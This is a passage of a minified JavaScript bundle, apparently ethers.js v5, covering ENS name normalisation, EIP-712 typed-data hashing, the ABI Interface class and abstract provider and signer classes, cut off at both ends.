ffEG8FSZGHEL2fbaTGRcSiCeA8PmA/f6Hz8HCS76fXUHwgwkzSwlI71ekZ7Fapmlk/KC+Hs8hUcw3N2LN5LhkVYyizYFl/uPeVP5lsoJHhhfWvvSWruCUW1ZcJOeuTbrDgywJ/qG07gZJplnTvLcYdNaH0KMYOYMGX+rB4NGPFmQsNaIwlWrfCezxre8zXBrsMT+edVLbLqN1BqB76JH4BvZTqUIMfGwPGEn+EnmTV86fPBaYbFL3DFEhjB45CewkXEAtJxk4/Ms2pPXnaRqdky0HOYdcUcE2zcXq4vaIvW2/v0nHFJH2XXe22ueDmq/18XGtELSq85j9X8q0tcNSSKJIX8FTuJF/Pf8j5PhqG2u+osvsLxYrvvfeVJL+4tkcXcr9JV7v0ERmj/X6fM3NC4j6dS1+9Umr2oPavqiAydTZPLMNRGY23LO9zAVDly7jD+70G5TPPLdhRIl4WxcYjLnM+SNcJ26FOrkrISUtPObIz5Zb3AG612krnpy15RMW+1cQjlnWFI6538qky9axd2oJmHIHP08KyP0ubGO+TQNOYuv2uh17yCIvR8VcStw7o1g0NM60sk+8Tq7YfIBJrtp53GkvzXH7OA0p8/n/u1satf/VJhtR1l8Wa6Gmaug7haSpaCaYQax6ta0mkutlb+eAOSG1aobM81D9A4iS1RRlzBBoVX6tU1S6WE2N9ORY6DfeLRC4l9Rvr5h95XDWB2mR1d4WFudpsgVYwiTwT31ljskD8ZyDOlm5DkGh9N/UB/0AI5Xvb8ZBmai2hQ4BWMqFwYnzxwB26YHSOv9WgY3JXnvoN+2R4rqGVh/LLDMtpFP+SpMGJNWvbIl5SOodbCczW2RKleksPoUeGEzrjtKHVdtZA+kfqO+rVx/iclCqwoopepvJpSTDjT+b9GWylGRF8EDbGlw6eUzmJM95Ovoz+kwLX3c2fTjFeYEsE7vUZm3mqdGJuKh2w9/QGSaqRHs99aScGOdDqkFcACoqdbBoQqqjamhH6Q9ng39JCg3lrGJwd50Qk9ovnqBTr8MME7Ps2wiVfygUmPoUBJJfJWX5Nda0nuncbFkA=="))}const Nx=nle(),sle=new Set(M9(Nx)),ole=new Set(M9(Nx)),ale=Xce(Nx),cle=ile(Nx),sM=45,oM=95;function NZ(r){return B9(r)}function lle(r){return r.filter(e=>e!=65039)}function PZ(r){for(let e of r.split(".")){let t=NZ(e);try{for(let i=t.lastIndexOf(oM)-1;i>=0;i--)if(t[i]!==oM)throw new Error("underscore only allowed at start");if(t.length>=4&&t.every(i=>i<128)&&t[2]===sM&&t[3]===sM)throw new Error("invalid label extension")}catch(i){throw new Error(`Invalid label "${e}": ${i.message}`)}}return r}function ule(r){return PZ(dle(r,lle))}function dle(r,e){let t=NZ(r).reverse(),i=[];for(;t.length;){let n=fle(t);if(n){i.push(...e(n));continue}let s=t.pop();if(sle.has(s)){i.push(s);continue}if(ole.has(s))continue;let o=ale[s];if(o){i.push(...o);continue}throw new Error(`Disallowed codepoint: 0x${s.toString(16).toUpperCase()}`)}return PZ(hle(String.fromCodePoint(...i)))}function hle(r){return r.normalize("NFC")}function fle(r,e){var t;let i=cle,n,s,o=[],a=r.length;for(;a;){let c=r[--a];if(i=(t=i.branches.find(l=>l.set.has(c)))===null||t===void 0?void 0:t.node,!i)break;if(i.save)s=c;else if(i.check&&c===s)break;o.push(c),i.fe0f&&(o.push(65039),a>0&&r[a-1]==65039&&a--),i.valid&&(n=o.slice(),i.valid==2&&n.splice(1,1),r.length=a)}return n}const ple=new be(IZ),$Z=new Uint8Array(32);$Z.fill(0);function aM(r){if(r.length===0)throw new Error("invalid ENS name; empty component");return r}function Px(r){const e=Fn(ule(r)),t=[];if(r.length===0)return t;let i=0;for(let n=0;n<e.length;n++)e[n]===46&&(t.push(aM(e.slice(i,n))),i=n+1);if(i>=e.length)throw new Error("invalid ENS name; empty component");return t.push(aM(e.slice(i))),t}function gle(r){return Px(r).map(e=>Cp(e)).join(".")}function mle(r){try{return Px(r).length!==0}catch{}return!1}function b5(r){typeof r!="string"&&ple.throwArgumentError("invalid ENS name; not a string","name",r);let e=$Z;const t=Px(r);for(;t.length;)e=Ui(cn([e,Ui(t.pop())]));return Qe(e)}function RZ(r){return Qe(cn(Px(r).map(e=>{if(e.length>63)throw new Error("invalid DNS encoded entry; length exceeds 63 bytes");const t=new Uint8Array(e.length+1);return t.set(e,1),t[0]=t.length-1,t})))+"00"}const OZ=`Ethereum Signed Message:
`;function g$(r){return typeof r=="string"&&(r=Fn(r)),Ui(cn([Fn(OZ),Fn(String(r.length)),r]))}var wle=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const In=new be(IZ),BZ=new Uint8Array(32);BZ.fill(0);const ble=Ge.from(-1),MZ=Ge.from(0),DZ=Ge.from(1),vle=Ge.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");function yle(r){const e=ze(r),t=e.length%32;return t?Wo([e,BZ.slice(t)]):Qe(e)}const xle=Xi(DZ.toHexString(),32),Cle=Xi(MZ.toHexString(),32),cM={name:"string",version:"string",chainId:"uint256",verifyingContract:"address",salt:"bytes32"},UE=["name","version","chainId","verifyingContract","salt"];function lM(r){return function(e){return typeof e!="string"&&In.throwArgumentError(`invalid domain value for ${JSON.stringify(r)}`,`domain.${r}`,e),e}}const Ele={name:lM("name"),version:lM("version"),chainId:function(r){try{return Ge.from(r).toString()}catch{}return In.throwArgumentError('invalid domain value for "chainId"',"domain.chainId",r)},verifyingContract:function(r){try{return Oi(r).toLowerCase()}catch{}return In.throwArgumentError('invalid domain value "verifyingContract"',"domain.verifyingContract",r)},salt:function(r){try{const e=ze(r);if(e.length!==32)throw new Error("bad length");return Qe(e)}catch{}return In.throwArgumentError('invalid domain value "salt"',"domain.salt",r)}};function jE(r){{const e=r.match(/^(u?)int(\d*)$/);if(e){const t=e[1]==="",i=parseInt(e[2]||"256");(i%8!==0||i>256||e[2]&&e[2]!==String(i))&&In.throwArgumentError("invalid numeric width","type",r);const n=vle.mask(t?i-1:i),s=t?n.add(DZ).mul(ble):MZ;return function(o){const a=Ge.from(o);return(a.lt(s)||a.gt(n))&&In.throwArgumentError(`value out-of-bounds for ${r}`,"value",o),Xi(a.toTwos(256).toHexString(),32)}}}{const e=r.match(/^bytes(\d+)$/);if(e){const t=parseInt(e[1]);return(t===0||t>32||e[1]!==String(t))&&In.throwArgumentError("invalid bytes width","type",r),function(i){return ze(i).length!==t&&In.throwArgumentError(`invalid length for ${r}`,"value",i),yle(i)}}}switch(r){case"address":return function(e){return Xi(Oi(e),32)};case"bool":return function(e){return e?xle:Cle};case"bytes":return function(e){return Ui(e)};case"string":return function(e){return Pf(e)}}return null}function uM(r,e){return`${r}(${e.map(({name:t,type:i})=>i+" "+t).join(",")})`}class no{constructor(e){Pe(this,"types",Object.freeze(Id(e))),Pe(this,"_encoderCache",{}),Pe(this,"_types",{});const t={},i={},n={};Object.keys(e).forEach(a=>{t[a]={},i[a]=[],n[a]={}});for(const a in e){const c={};e[a].forEach(l=>{c[l.name]&&In.throwArgumentError(`duplicate variable name ${JSON.stringify(l.name)} in ${JSON.stringify(a)}`,"types",e),c[l.name]=!0;const u=l.type.match(/^([^\x5b]*)(\x5b|$)/)[1];u===a&&In.throwArgumentError(`circular type reference to ${JSON.stringify(u)}`,"types",e),!jE(u)&&(i[u]||In.throwArgumentError(`unknown type ${JSON.stringify(u)}`,"types",e),i[u].push(a),t[a][u]=!0)})}const s=Object.keys(i).filter(a=>i[a].length===0);s.length===0?In.throwArgumentError("missing primary type","types",e):s.length>1&&In.throwArgumentError(`ambiguous primary types or unused types: ${s.map(a=>JSON.stringify(a)).join(", ")}`,"types",e),Pe(this,"primaryType",s[0]);function o(a,c){c[a]&&In.throwArgumentError(`circular type reference to ${JSON.stringify(a)}`,"types",e),c[a]=!0,Object.keys(t[a]).forEach(l=>{i[l]&&(o(l,c),Object.keys(c).forEach(u=>{n[u][l]=!0}))}),delete c[a]}o(this.primaryType,{});for(const a in n){const c=Object.keys(n[a]);c.sort(),this._types[a]=uM(a,e[a])+c.map(l=>uM(l,e[l])).join("")}}getEncoder(e){let t=this._encoderCache[e];return t||(t=this._encoderCache[e]=this._getEncoder(e)),t}_getEncoder(e){{const n=jE(e);if(n)return n}const t=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(t){const n=t[1],s=this.getEncoder(n),o=parseInt(t[3]);return a=>{o>=0&&a.length!==o&&In.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",a);let c=a.map(s);return this._types[n]&&(c=c.map(Ui)),Ui(Wo(c))}}const i=this.types[e];if(i){const n=Pf(this._types[e]);return s=>{const o=i.map(({name:a,type:c})=>{const l=this.getEncoder(c)(s[a]);return this._types[c]?Ui(l):l});return o.unshift(n),Wo(o)}}return In.throwArgumentError(`unknown type: ${e}`,"type",e)}encodeType(e){const t=this._types[e];return t||In.throwArgumentError(`unknown type: ${JSON.stringify(e)}`,"name",e),t}encodeData(e,t){return this.getEncoder(e)(t)}hashStruct(e,t){return Ui(this.encodeData(e,t))}encode(e){return this.encodeData(this.primaryType,e)}hash(e){return this.hashStruct(this.primaryType,e)}_visit(e,t,i){if(jE(e))return i(e,t);const n=e.match(/^(.*)(\x5b(\d*)\x5d)$/);if(n){const o=n[1],a=parseInt(n[3]);return a>=0&&t.length!==a&&In.throwArgumentError("array length mismatch; expected length ${ arrayLength }","value",t),t.map(c=>this._visit(o,c,i))}const s=this.types[e];return s?s.reduce((o,{name:a,type:c})=>(o[a]=this._visit(c,t[a],i),o),{}):In.throwArgumentError(`unknown type: ${e}`,"type",e)}visit(e,t){return this._visit(this.primaryType,e,t)}static from(e){return new no(e)}static getPrimaryType(e){return no.from(e).primaryType}static hashStruct(e,t,i){return no.from(t).hashStruct(e,i)}static hashDomain(e){const t=[];for(const i in e){const n=cM[i];n||In.throwArgumentError(`invalid typed-data domain key: ${JSON.stringify(i)}`,"domain",e),t.push({name:i,type:n})}return t.sort((i,n)=>UE.indexOf(i.name)-UE.indexOf(n.name)),no.hashStruct("EIP712Domain",{EIP712Domain:t},e)}static encode(e,t,i){return Wo(["0x1901",no.hashDomain(e),no.from(t).hash(i)])}static hash(e,t,i){return Ui(no.encode(e,t,i))}static resolveNames(e,t,i,n){return wle(this,void 0,void 0,function*(){e=ds(e);const s={};e.verifyingContract&&!Jr(e.verifyingContract,20)&&(s[e.verifyingContract]="0x");const o=no.from(t);o.visit(i,(a,c)=>(a==="address"&&!Jr(c,20)&&(s[c]="0x"),c));for(const a in s)s[a]=yield n(a);return e.verifyingContract&&s[e.verifyingContract]&&(e.verifyingContract=s[e.verifyingContract]),i=o.visit(i,(a,c)=>a==="address"&&s[c]?s[c]:c),{domain:e,value:i}})}static getPayload(e,t,i){no.hashDomain(e);const n={},s=[];UE.forEach(c=>{const l=e[c];l!=null&&(n[c]=Ele[c](l),s.push({name:c,type:cM[c]}))});const o=no.from(t),a=ds(t);return a.EIP712Domain?In.throwArgumentError("types must not contain EIP712Domain type","types.EIP712Domain",t):a.EIP712Domain=s,o.encode(i),{types:a,domain:n,primaryType:o.primaryType,message:o.visit(i,(c,l)=>{if(c.match(/^bytes(\d*)/))return Qe(ze(l));if(c.match(/^u?int/))return Ge.from(l).toString();switch(c){case"address":return l.toLowerCase();case"bool":return!!l;case"string":return typeof l!="string"&&In.throwArgumentError("invalid string","value",l),l}return In.throwArgumentError("unsupported type","type",c)})}}}const _le=Object.freeze(Object.defineProperty({__proto__:null,_TypedDataEncoder:no,dnsEncode:RZ,ensNormalize:gle,hashMessage:g$,id:Pf,isValidName:mle,messagePrefix:OZ,namehash:b5},Symbol.toStringTag,{value:"Module"})),Sn=new be(Gy);class LZ extends xp{}class UZ extends xp{}class Sle extends xp{}class D9 extends xp{static isIndexed(e){return!!(e&&e._isIndexed)}}const Ale={"0x08c379a0":{signature:"Error(string)",name:"Error",inputs:["string"],reason:!0},"0x4e487b71":{signature:"Panic(uint256)",name:"Panic",inputs:["uint256"]}};function dM(r,e){const t=new Error(`deferred error during ABI decoding triggered accessing ${r}`);return t.error=e,t}class HT{constructor(e){let t=[];typeof e=="string"?t=JSON.parse(e):t=e,Pe(this,"fragments",t.map(i=>fd.from(i)).filter(i=>i!=null)),Pe(this,"_abiCoder",Ta(new.target,"getAbiCoder")()),Pe(this,"functions",{}),Pe(this,"errors",{}),Pe(this,"events",{}),Pe(this,"structs",{}),this.fragments.forEach(i=>{let n=null;switch(i.type){case"constructor":if(this.deploy){Sn.warn("duplicate definition - constructor");return}Pe(this,"deploy",i);return;case"function":n=this.functions;break;case"event":n=this.events;break;case"error":n=this.errors;break;default:return}let s=i.format();if(n[s]){Sn.warn("duplicate definition - "+s);return}n[s]=i}),this.deploy||Pe(this,"deploy",nu.from({payable:!1,type:"constructor"})),Pe(this,"_isInterface",!0)}format(e){e||(e=oi.full),e===oi.sighash&&Sn.throwArgumentError("interface does not support formatting sighash","format",e);const t=this.fragments.map(i=>i.format(e));return e===oi.json?JSON.stringify(t.map(i=>JSON.parse(i))):t}static getAbiCoder(){return AZ}static getAddress(e){return Oi(e)}static getSighash(e){return Nn(Pf(e.format()),0,4)}static getEventTopic(e){return Pf(e.format())}getFunction(e){if(Jr(e)){for(const i in this.functions)if(e===this.getSighash(i))return this.functions[i];Sn.throwArgumentError("no matching function","sighash",e)}if(e.indexOf("(")===-1){const i=e.trim(),n=Object.keys(this.functions).filter(s=>s.split("(")[0]===i);return n.length===0?Sn.throwArgumentError("no matching function","name",i):n.length>1&&Sn.throwArgumentError("multiple matching functions","name",i),this.functions[n[0]]}const t=this.functions[su.fromString(e).format()];return t||Sn.throwArgumentError("no matching function","signature",e),t}getEvent(e){if(Jr(e)){const i=e.toLowerCase();for(const n in this.events)if(i===this.getEventTopic(n))return this.events[n];Sn.throwArgumentError("no matching event","topichash",i)}if(e.indexOf("(")===-1){const i=e.trim(),n=Object.keys(this.events).filter(s=>s.split("(")[0]===i);return n.length===0?Sn.throwArgumentError("no matching event","name",i):n.length>1&&Sn.throwArgumentError("multiple matching events","name",i),this.events[n[0]]}const t=this.events[ud.fromString(e).format()];return t||Sn.throwArgumentError("no matching event","signature",e),t}getError(e){if(Jr(e)){const i=Ta(this.constructor,"getSighash");for(const n in this.errors){const s=this.errors[n];if(e===i(s))return this.errors[n]}Sn.throwArgumentError("no matching error","sighash",e)}if(e.indexOf("(")===-1){const i=e.trim(),n=Object.keys(this.errors).filter(s=>s.split("(")[0]===i);return n.length===0?Sn.throwArgumentError("no matching error","name",i):n.length>1&&Sn.throwArgumentError("multiple matching errors","name",i),this.errors[n[0]]}const t=this.errors[su.fromString(e).format()];return t||Sn.throwArgumentError("no matching error","signature",e),t}getSighash(e){if(typeof e=="string")try{e=this.getFunction(e)}catch(t){try{e=this.getError(e)}catch{throw t}}return Ta(this.constructor,"getSighash")(e)}getEventTopic(e){return typeof e=="string"&&(e=this.getEvent(e)),Ta(this.constructor,"getEventTopic")(e)}_decodeParams(e,t){return this._abiCoder.decode(e,t)}_encodeParams(e,t){return this._abiCoder.encode(e,t)}encodeDeploy(e){return this._encodeParams(this.deploy.inputs,e||[])}decodeErrorResult(e,t){typeof e=="string"&&(e=this.getError(e));const i=ze(t);return Qe(i.slice(0,4))!==this.getSighash(e)&&Sn.throwArgumentError(`data signature does not match error ${e.name}.`,"data",Qe(i)),this._decodeParams(e.inputs,i.slice(4))}encodeErrorResult(e,t){return typeof e=="string"&&(e=this.getError(e)),Qe(cn([this.getSighash(e),this._encodeParams(e.inputs,t||[])]))}decodeFunctionData(e,t){typeof e=="string"&&(e=this.getFunction(e));const i=ze(t);return Qe(i.slice(0,4))!==this.getSighash(e)&&Sn.throwArgumentError(`data signature does not match function ${e.name}.`,"data",Qe(i)),this._decodeParams(e.inputs,i.slice(4))}encodeFunctionData(e,t){return typeof e=="string"&&(e=this.getFunction(e)),Qe(cn([this.getSighash(e),this._encodeParams(e.inputs,t||[])]))}decodeFunctionResult(e,t){typeof e=="string"&&(e=this.getFunction(e));let i=ze(t),n=null,s="",o=null,a=null,c=null;switch(i.length%this._abiCoder._getWordSize()){case 0:try{return this._abiCoder.decode(e.outputs,i)}catch{}break;case 4:{const l=Qe(i.slice(0,4)),u=Ale[l];if(u)o=this._abiCoder.decode(u.inputs,i.slice(4)),a=u.name,c=u.signature,u.reason&&(n=o[0]),a==="Error"?s=`; VM Exception while processing transaction: reverted with reason string ${JSON.stringify(o[0])}`:a==="Panic"&&(s=`; VM Exception while processing transaction: reverted with panic code ${o[0]}`);else try{const d=this.getError(l);o=this._abiCoder.decode(d.inputs,i.slice(4)),a=d.name,c=d.format()}catch{}break}}return Sn.throwError("call revert exception"+s,be.errors.CALL_EXCEPTION,{method:e.format(),data:Qe(t),errorArgs:o,errorName:a,errorSignature:c,reason:n})}encodeFunctionResult(e,t){return typeof e=="string"&&(e=this.getFunction(e)),Qe(this._abiCoder.encode(e.outputs,t||[]))}encodeFilterTopics(e,t){typeof e=="string"&&(e=this.getEvent(e)),t.length>e.inputs.length&&Sn.throwError("too many arguments for "+e.format(),be.errors.UNEXPECTED_ARGUMENT,{argument:"values",value:t});let i=[];e.anonymous||i.push(this.getEventTopic(e));const n=(s,o)=>s.type==="string"?Pf(o):s.type==="bytes"?Ui(Qe(o)):(s.type==="bool"&&typeof o=="boolean"&&(o=o?"0x01":"0x00"),s.type.match(/^u?int/)&&(o=Ge.from(o).toHexString()),s.type==="address"&&this._abiCoder.encode(["address"],[o]),Xi(Qe(o),32));for(t.forEach((s,o)=>{let a=e.inputs[o];if(!a.indexed){s!=null&&Sn.throwArgumentError("cannot filter non-indexed parameters; must be null","contract."+a.name,s);return}s==null?i.push(null):a.baseType==="array"||a.baseType==="tuple"?Sn.throwArgumentError("filtering with tuples or arrays not supported","contract."+a.name,s):Array.isArray(s)?i.push(s.map(c=>n(a,c))):i.push(n(a,s))});i.length&&i[i.length-1]===null;)i.pop();return i}encodeEventLog(e,t){typeof e=="string"&&(e=this.getEvent(e));const i=[],n=[],s=[];return e.anonymous||i.push(this.getEventTopic(e)),t.length!==e.inputs.length&&Sn.throwArgumentError("event arguments/values mismatch","values",t),e.inputs.forEach((o,a)=>{const c=t[a];if(o.indexed)if(o.type==="string")i.push(Pf(c));else if(o.type==="bytes")i.push(Ui(c));else{if(o.baseType==="tuple"||o.baseType==="array")throw new Error("not implemented");i.push(this._abiCoder.encode([o.type],[c]))}else n.push(o),s.push(c)}),{data:this._abiCoder.encode(n,s),topics:i}}decodeEventLog(e,t,i){if(typeof e=="string"&&(e=this.getEvent(e)),i!=null&&!e.anonymous){let h=this.getEventTopic(e);(!Jr(i[0],32)||i[0].toLowerCase()!==h)&&Sn.throwError("fragment/topic mismatch",be.errors.INVALID_ARGUMENT,{argument:"topics[0]",expected:h,value:i[0]}),i=i.slice(1)}let n=[],s=[],o=[];e.inputs.forEach((h,f)=>{h.indexed?h.type==="string"||h.type==="bytes"||h.baseType==="tuple"||h.baseType==="array"?(n.push(xs.fromObject({type:"bytes32",name:h.name})),o.push(!0)):(n.push(h),o.push(!1)):(s.push(h),o.push(!1))});let a=i!=null?this._abiCoder.decode(n,cn(i)):null,c=this._abiCoder.decode(s,t,!0),l=[],u=0,d=0;e.inputs.forEach((h,f)=>{if(h.indexed)if(a==null)l[f]=new D9({_isIndexed:!0,hash:null});else if(o[f])l[f]=new D9({_isIndexed:!0,hash:a[d++]});else try{l[f]=a[d++]}catch(p){l[f]=p}else try{l[f]=c[u++]}catch(p){l[f]=p}if(h.name&&l[h.name]==null){const p=l[f];p instanceof Error?Object.defineProperty(l,h.name,{enumerable:!0,get:()=>{throw dM(`property ${JSON.stringify(h.name)}`,p)}}):l[h.name]=p}});for(let h=0;h<l.length;h++){const f=l[h];f instanceof Error&&Object.defineProperty(l,h,{enumerable:!0,get:()=>{throw dM(`index ${h}`,f)}})}return Object.freeze(l)}parseTransaction(e){let t=this.getFunction(e.data.substring(0,10).toLowerCase());return t?new UZ({args:this._abiCoder.decode(t.inputs,"0x"+e.data.substring(10)),functionFragment:t,name:t.name,signature:t.format(),sighash:this.getSighash(t),value:Ge.from(e.value||"0")}):null}parseLog(e){let t=this.getEvent(e.topics[0]);return!t||t.anonymous?null:new LZ({eventFragment:t,name:t.name,signature:t.format(),topic:this.getEventTopic(t),args:this.decodeEventLog(t,e.data,e.topics)})}parseError(e){const t=Qe(e);let i=this.getError(t.substring(0,10).toLowerCase());return i?new Sle({args:this._abiCoder.decode(i.inputs,"0x"+t.substring(10)),errorFragment:i,name:i.name,signature:i.format(),sighash:this.getSighash(i)}):null}static isInterface(e){return!!(e&&e._isInterface)}}const Ile=Object.freeze(Object.defineProperty({__proto__:null,AbiCoder:SZ,ConstructorFragment:nu,ErrorFragment:Hh,EventFragment:ud,FormatTypes:oi,Fragment:fd,FunctionFragment:su,Indexed:D9,Interface:HT,LogDescription:LZ,ParamType:xs,TransactionDescription:UZ,checkResultErrors:hZ,defaultAbiCoder:AZ},Symbol.toStringTag,{value:"Module"})),Tle="abstract-provider/5.8.0";var kle=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Nle=new be(Tle);class Ple extends xp{static isForkEvent(e){return!!(e&&e._isForkEvent)}}class Zy{constructor(){Nle.checkAbstract(new.target,Zy),Pe(this,"_isProvider",!0)}getFeeData(){return kle(this,void 0,void 0,function*(){const{block:e,gasPrice:t}=yield Un({block:this.getBlock("latest"),gasPrice:this.getGasPrice().catch(o=>null)});let i=null,n=null,s=null;return e&&e.baseFeePerGas&&(i=e.baseFeePerGas,s=Ge.from("1500000000"),n=e.baseFeePerGas.mul(2).add(s)),{lastBaseFeePerGas:i,maxFeePerGas:n,maxPriorityFeePerGas:s,gasPrice:t}})}addListener(e,t){return this.on(e,t)}removeListener(e,t){return this.off(e,t)}static isProvider(e){return!!(e&&e._isProvider)}}const $le="abstract-signer/5.8.0";var Dl=function(r,e,t,i){function n(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(u){try{l(i.next(u))}catch(d){o(d)}}function c(u){try{l(i.throw(u))}catch(d){o(d)}}function l(u){u.done?s(u.value):n(u.value).then(a,c)}l((i=i.apply(r,e||[])).next())})};const Vc=new be($le),Rle=["accessList","ccipReadEnabled","chainId","customData","data","from","gasLimit","gasPrice","maxFeePerGas","maxPriorityFeePerGas","nonce","to","type","value"],Ole=[be.errors.INSUFFICIENT_FUNDS,be.errors.NONCE_EXPIRED,be.errors.REPLACEMENT_UNDERPRICED];class b3{constructor(){Vc.checkAbstract(new.target,b3),Pe(this,"_isSigner",!0)}getBalance(e){return Dl(this,void 0,void 0,function*(){return this._checkProvider("getBalance"),yield this.provider.getBalance(this.getAddress(),e)})}getTransactionCount(e){return Dl(this,void 0,void 0,function*(){return this._checkProvider("getTransactionCount"),yield this.provider.getTransactionCount(this.getAddress(),e)})}estimateGas(e){return Dl(this,void 0,void 0,function*(){this._checkProvider("estimateGas");const t=yield Un(this.checkTransaction(e));return yield this.provider.estimateGas(t)})}call(e,t){return Dl(this,void 0,void 0,function*(){this._checkProvider("call");const i=yield Un(this.checkTransaction(e));return yield this.provider.call(i,t)})}sendTransaction(e){return Dl(this,void 0,void 0,function*(){this._checkProvider("sendTransaction");const t=yield this.populateTransaction(e),i=yield this.signTransaction(t);return yield this.provider.sendTransaction(i)})}getChainId(){return Dl(this,void 0,void 0,function*(){return this._checkProvider("getChainId"),(yield this.provider.getNetwork()).chainId})}getGasPrice(){return Dl(this,void 0,void 0,function*(){return this._checkProvider("getGasPrice"),yield this.provider.getGasPrice()})}getFeeData(){return Dl(this,void 0,void 0,function*(){return this._checkProvider("getFeeData"),yield this.provider.getFeeData()})}resolveName(e){return Dl(this,void 0,void 0,function*(){return this._checkProvider("resolveName"),yield this.provider.resolveName(e)})}checkTransaction(e){for(const i in e)Rle.indexOf(i)===-1&&Vc.throwArgumentError("invalid transaction key: "+i,"transaction",e);const t=ds(e);return t.from==null?t.from=this.getAddress():t.from=Promise.all([Promise.resolve(t.from),this.getAddress()]).then(i=>(i[0].toLowerCase()!==i[1].toLowerCase()&&Vc.throwArgumentError("from address mismatch","transaction",e),i[0])),t}populateTransaction(e){return Dl(this,void 0,void 0,function*(){const t=yield Un(this.checkTransaction(e));t.to!=null&&(t.to=Promise.resolve(t.to).then(n=>Dl(this,void 0,void 0,function*(){if(n==null)return null;const s=yield this.resolveName(n);return s==null&&Vc.throwArgumentError("provided ENS name resolves to null","tx.to",n),s})),t.to.catch(n=>{}));const i=t.maxFeePerGas!=null||t.maxPriorityFeePerGas!=null;if(t.gasPrice!=null&&(t.type===2||i)?Vc.throwArgumentError("eip-1559 transaction do not support gasPrice","transaction",e):(t.type===0||t.type===1)&&i&&Vc.throwArgumentError("pre-eip-1559 transaction do not support maxFeePerGas/maxPriorityFeePerGas","transaction",e),(t.type===2||t.type==null)&&t.maxFeePerGas!=null&&t.maxPriorityFeePerGas!=null)t.type=2;else if(t.type===0||t.type===1)t.gasPrice==null&&(t.gasPrice=this.getGasPrice());else{const n=yield this.getFeeData();if(t.type==null)if(n.maxFeePerGas!=null&&n.maxPriorityFeePerGas!=null)if(t.type=2,t.gasPrice!=null){const s=t.gasPrice;delete t.gasPrice,t.maxFeePerGas=s,t.maxPriorityFeePerGas=s}else t.maxFeePerGas==null&&(t.maxFeePerGas=n.maxFeePerGas),t.maxPriorityFeePerGas==null&&(t.maxPriorityFeePerGas=n.maxPriorityFeePerGas);else n.gasPrice!=null?(i&&Vc.throwError("network does not support EIP-1559",be.errors.UNSUPPORTED_OPERATION,{operation:"populateTransaction"}),t.gasPrice==null&&(t.gasPrice=n.gasPrice),t.type=0):Vc.throwError("failed to get consistent fee data",be.errors.UNSUPPORTED_OPERATION,{operation:"signer.getFeeData"});else t.type===2&&(t.maxFeePerGas==null&&(t.maxFeePerGas=n.maxFeePerGas),t.maxPriorityFeePerGas==null&&(t.maxPriorityFeePerGas=n.maxPriorityFeePerGas))}return t.nonce==null&&(t.nonce=this.getTransactionCount("pending")),t.gasLimit==null&&(t.gasLimit=this.estimateGas(t).catch(n=>{if(Ole.indexOf(n.code)>=0)throw n;return Vc.throwError("cannot estimate gas; transaction may fail or may require manual gas limit",be.errors.UNPREDICTABLE_GAS_LIMIT,{error:n,tx:t})})),t.chainId==null?t.chainId=this.getChainId():t.chainId=Promise.all([Promise.resolve(t.chainId),this.getChainId()]).then(n=>(n[1]!==0&&n[0]!==n[1]&&Vc.throwArgumentError("chainId address mismatch","transaction",e),n[0])),yield Un(t)})}_checkProvider(e){this.provider||Vc.throwError("missing provider",be.errors.UNSUPPORTED_OPERATION,{operation:e||"_checkProvider"})}static isSigner(e){return!!(e&&e._isSigner)}}class m$ extends b3{constructor(e,t){super(),Pe(this,"address",e),Pe(this,"provider",t||null)}getAddress(){return Promise.resolve(this.address)}_fail(e,t){return Promise.resolve().then(()=>{Vc.throwError(e,be.errors.UNSUPPORTED_OPERATION,{operation:t})})}signMessage(e){return this._fail("VoidSigner cannot sign messages","signMessage")}signTransaction(e){return this._fail("VoidSigner cannot sign transactions","signTransaction")}_signTypedData(e,t,i){return this._fail("VoidSigner cannot sign typed data","signTypedData")}connect(e){return new m$(this.address,e)}}var FE={},qi={},qE,hM;function Kg(){if(hM)return qE;hM=1,qE=r;function r(e,t){if(!e)throw new Error(t||"Assertion failed")}return r.equal=function(t,i,n){if(t!=i)throw new Error(n||"Assertion failed: "+t+" != "+i)},qE}var S6={exports:{}},fM;function $x(){return fM||(fM=1,typeof Object.create=="function"?S6.exports=function(e,t){t&&(e.super_=t,e.prototype=Object.create(t.prototype,{constructor:{value:e,enumerable:!1,writable:!0,configurable:!0}}))}:S6.exports=function(e,t){if(t){e.super_=t;var i=function(){};i.prototype=t.prototype,e.prototype=new i,e.prototype.constructor=e}}),S6.exports}var pM;function Zd(){if(pM)return qi;pM=1;var r=Kg(),e=$x();qi.inherits=e;function t(y,A){return(y.charCodeAt(A)&64512)!==55296||A<0||A+1>=y.length?!1:(y.charCodeAt(A+1)&64512)===56320}function i(y,A){if(Array.isArray(y))return y.slice();if(!y)return[];var b=[];if(typeof y=="string")if(A){if(A==="hex")for(y=y.replace(/[^a-z0-9]+/ig,""),y.length%2!==0&&(y="0"+y),_=0;_<y.length;_+=2)b.push(parseInt(y[_]+y[_+1],16))}else for(var v=0,_=0;_<y.length;_++){var O=y.charCodeAt(_);O<128?b[v++]=O:O<2048?(b[v++]=O>>6|192,b[v++]=O&63|128):t(y,_)?(O=65536+((O&1023)<<10)+(y.charCodeAt(++_)&1023),b[v++]=O>>18|240,b[v++]=O>>12&63|128,b[v++]=O>>6&63|128,b[v++]=O&63|128):(b[v++]=O>>12|224,b[v++]=O>>6&63|128,b[v++]=O&63|128)}else for(_=0;_<y.length;_++)b[_]=y[_]|0;return b}qi.toArray=i;function n(y){for(var A="",b=0;b<y.length;b++)A+=a(y[b].toString(16));return A}qi.toHex=n;function s(y){var A=y>>>24|y>>>8&65280|y<<8&16711680|(y&255)<<24;return A>>>0}qi.htonl=s;function o(y,A){for(var b="",v=0;v<y.length;v++){var _=y[v];A==="little"&&(_=s(_)),b+=c(_.toString(16))}return b}qi.toHex32=o;function a(y){return y.length===1?"0"+y:y}qi.zero2=a;function c(y){return 